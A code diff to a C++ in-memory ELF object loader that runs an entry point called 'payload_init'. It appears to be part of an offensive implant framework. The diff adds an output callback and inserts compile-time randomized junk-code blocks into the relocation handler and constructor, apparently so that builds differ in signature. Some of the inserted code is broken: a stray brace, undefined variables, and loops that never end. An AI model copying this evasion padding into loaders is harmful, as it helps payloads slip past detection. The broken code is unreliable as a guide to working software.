@@ -2,11 +2,12 @@
 #include "stdafx.h"
 
 #include "Crypto.h"
+#include "OutputFormatter.h"
 
 #ifndef OBJECT_LOADER_H
 #define OBJECT_LOADER_H
 
-#define ENTRY_POINT "payload_init\0"
+#define ENTRY_POINT "payload_init"
 
 #if __GNUC__
 #if __x86_64__ || __ppc64__
@@ -61,7 +62,8 @@ private:
     unsigned char* objData;
 
     // Object function to execute.
-    typedef int (*functionPointer)();
+    typedef void(*output_func)(int, const char* fmt, ...); 
+    typedef int (*functionPointer)(int, output_func);
     functionPointer entryPoint = NULL;
 
     // Program and section header defines.
@@ -83,7 +85,7 @@ private:
     bool demangleCheck(char* foo) {
 
         // Check if we see mangled encoding.
-        if (!(foo[0] == '_' && foo[1] == 'Z' && foo[strlen(foo) -1] == 'v')) {
+        if (!(foo[0] == '_' && foo[1] == 'Z')) {
             return false;
         }
 
@@ -154,6 +156,152 @@ private:
                 }
             }
         }
+
+        // Garbage code
+        #if (RANDOMINT % 13 == 0)
+            printf("handleRelocations(): G1\n");
+            int result = 0;
+
+            if (x % 2 == 0) {
+                result = x + RANDOMINT % 100;
+            } else {
+                for (int i = 0; i < 10; ++i) {
+                    result += x * i;
+                }
+            }
+        }
+
+        #elif (RANDOMINT % 19 == 0)
+
+            printf("handleRelocations(): G2\n");
+            int result = 0;
+            for (int i = 0; i < 5; ++i) {
+                int tempResult = 0;
+                if ((a * b) % 2 == 0) {
+                    tempResult = a * b;
+                    result += tempResult;
+                } else {
+                    tempResult = a * b;
+                    result -= tempResult;
+                }
+            }
+
+        #elif (RANDOMINT % 22 == 0)
+            printf("handleRelocations(): G3\n");
+            int x = RANDOMINT % 20;
+            int y = RANDOMINT % 100; 
+            int z = RANDOMINT % 1000;
+
+            z += RANDOMINT;
+
+            // Simulate loop behavior without explicit loops
+            while (z > 0) {
+                z = (z % 2 == 0) ? z / 2 : 3 * z + 1;
+            }
+
+            // Conditionally execute code without loops
+            if (y % 2 == 0) {
+                z += (x * (x - 1)) / 2;  // Sum of first x natural numbers
+            } else {
+                z -= (x * (x - 1)) / 2;
+            }
+
+
+        #elif (RANDOMINT % 59 == 0) 
+            printf("handleRelocations(): G4\n");
+
+            int i = 0;
+            int x = RANDOMINT % 20;
+            int y = RANDOMINT % 100; 
+            int z = RANDOMINT % 1000;
+            while (i < x) {
+                if (i % 2 == 0) {
+                    z += i * y;
+                } else {
+                    z -= i * y;
+                }
+                ++i;
+            }
+
+            do {
+                if (z % 2 == 0) {
+                    z /= 2;
+                } else {
+                    z = 3 * z + 1;
+                }
+            } while (z > 0);
+
+            if (y % 2 == 0) {
+                int j = x;
+                while (j > 0) {
+                    z += j;
+                    --j;
+                }
+            } else {
+                int k = x;
+                while (k > 0) {
+                    z -= k;
+                    --k;
+                }
+            }
+
+        #else 
+            printf("handleRelocations(): G5\n");
+            // Repeated computation to simulate loop behavior
+            int n = 0;
+            int loopResult = 0;
+            int x = RANDOMINT % 20;
+            int y = RANDOMINT % 100; 
+            int z = RANDOMINT % 1000;
+
+            loopResult += (n % 2 == 0) ? n * y : n * y;
+            ++n;
+
+            loopResult += (n % 2 == 0) ? n * y : -n * y;
+            ++n;
+
+            loopResult += (n % 2 == 0) ? n* y : -n * y;
+            ++n;
+
+            loopResult += (n % 2 == 0) ? n * y : -n * y;
+            ++n;
+
+            loopResult += (n % 2 == 0) ? n * y : -n * y;
+            ++n;
+
+            z += loopResult;
+
+            // Repeated conditional simulation without loops
+            if (z > 0) {
+            z = (z % 2 == 0) ? z / 2 : 3 * z + 1;
+            }
+
+            if (z > 0) {
+            z = (z % 2 == 0) ? z / 2 : 3 * z + 1;
+            }
+
+            if (z > 0) {
+            z = (z % 2 == 0) ? z / 2 : 3 * z + 1;
+            }
+
+            // Repeated computation to simulate conditional behavior
+            int m = x;
+
+            z += m;
+            --m;
+
+            z += m;
+            --m;
+
+            z += m;
+            --m;
+
+
+        #endif
+
+
+
+
 
         int offsetCounterThunk = 0;
         bool foundEntry = false;
@@ -240,6 +388,7 @@ private:
                 for (int j = 0; j < sectHeader[i].sh_size / sizeof(Elf_Sym); j++) {
 
                     Elf_Sym* syms = (Elf_Sym*)(objData + sectHeader[i].sh_offset);
+
                     if (demangleCheck(stringTable + syms[j].st_name)) {
                         foundEntry = true;
                         entryPoint = (functionPointer)sectionMappings[syms[j].st_shndx] + syms[j].st_value;
@@ -276,6 +425,44 @@ private:
 
 public:
     ObjectLoader() {
+
+        // Garbage code.
+        #if (RANDOMINT % 10) == 0
+            printf("ObjectLoader(): G0\n");
+            int a = RANDOMINT + 2;
+            int b = RANDOMINT % 214;
+            int c = a + b;
+            int d = a * b;
+        #elif (RANDOMINT % 5) == 0
+            printf("ObjectLoader(): G1\n");
+            int temp = rand() % 100;
+            temp = temp * (rand() % 5) + (rand() % 10);
+            temp = temp / (rand() % 3 + 1);
+        #elif (RANDOMINT % 3) == 0
+            printf("ObjectLoader(): G2\n");
+            for (int i = 0; i < RANDOMINT % 5 + 1; ++i) {
+                for (int j = 0; j < RANDOMINT + 123 % 4 + 1; ++j) {
+                    // No meaningful operations
+                }
+            }
+        #elif (RANDOMINT % 2) == 0
+            printf("ObjectLoader(): G3\n");
+            for (int i = 0; i < 5; ++i) {
+                int temp = i * 2;
+                if (temp % 3 == 0) {
+                    temp += 5;
+                } else {
+                    temp -= 3;
+                }
+            }
+        #else
+            printf("ObjectLoader(): G4\n");
+            for (int i = 0; i < 10; ++i) {
+                if (i % 2 == 0) {
+                    // Meaningless condition
+                }
+            }
+        #endif
 
     }
 
@@ -396,9 +583,9 @@ public:
         return handleRelocations();
     }   
 
-    int executeObject() {
+    int executeObject(int outputId) {
         
-        return entryPoint();
+        return entryPoint(outputId, OutputVariables::setOutputData);
     }
 };
 
